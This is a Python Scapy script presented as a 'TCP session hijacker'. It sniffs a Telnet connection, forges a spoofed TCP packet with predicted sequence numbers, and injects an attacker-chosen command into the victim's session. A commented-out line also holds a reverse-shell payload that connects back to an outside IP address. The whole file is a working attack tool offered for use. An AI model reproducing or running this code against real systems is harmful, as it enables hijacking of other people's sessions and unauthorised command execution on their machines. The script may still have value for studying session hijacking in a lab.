#!usr/bin/python3
import sys
from scapy.all import *
import pyfiglet
#colors
class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    FAIL = '\033[91m' #RED
    RESET = '\033[0m' #RESET COLOR
    B = "\033[0;34;40m" # Blue
    orange='\033[43m' 
    purple='\033[45m'
    cyan='\033[46m'
    lightgrey='\033[47m'
    lightgrey='\033[37m'
    darkgrey='\033[90m'
    lightred='\033[91m'
    pink='\033[95m'

ascii_banner = pyfiglet.figlet_format("TCP SESSION HIJACKER !!")
print(ascii_banner)
print(f"{bcolors.pink}Author: Viraj Vaishnav{bcolors.RESET}")
print(f"{bcolors.pink}Follow on: https://twitter.com/VirajVaishnav16{bcolors.RESET}")
print("")
print(f"{bcolors.FAIL}This script only work for telnet Session...{bcolors.RESET}")
def spoof(pkt):
      # work best in telnet and ftp connections....
      print(f"=====================injection started====================")
      oldtcp = pkt[TCP]
      #newseq = oldtcp.seq + len(pkt) + 20
      newseq = oldtcp.seq + 10
      newack = oldtcp.ack + 1
      ip = IP(src=anothervictim,dst=targetip)
      tcp=TCP(sport=oldtcp.sport,dport=oldtcp.dport,flags="A",seq=newseq,ack=newack)
      #data="\ntouch /home/msfadmin/sessionhijacking.txt\n"
      cmd = input(f"{bcolors.WARNING}Enter the command you want to execute in victim machine..:{bcolors.RESET}{bcolors.lightred}")
      print(f"{bcolors.RESET}")
      data = "\n"+cmd+"\n"
      #data="\ntouch /home/sessionhijacking.txt\n"
      #data = "\n/bin/bash -i >/dev/tcp/192.68.43.224/9090 0<&1 2>&1\n"
      packet = ip/tcp/data
      ls(packet)
      send(packet,verbose=0)
      print(f"{bcolors.WARNING} Command : {cmd} executed successfully in victim's machine {bcolors.RESET} ")
      print("==================injection done=========================")
      quit()
      
      
targetip = input("Target IP(Werver): ")
anothervictim = input("Another Victim IP( Client ): ") 
iface = input("Network Interface you are using currently e.g. usb,wlo1,eth0: ")
#myfilter = 'tcp and src host '+anothervictim+' and dst host '+targetip
myfilter = 'tcp and src host 192.168.43.58 and dst host 192.168.43.167 and dst port 23'
sniff(iface=iface,filter="(ip src "+anothervictim+" and ip dst "+targetip + ")",prn=spoof)
#sniff(filter=myfilter,prn=spoof)
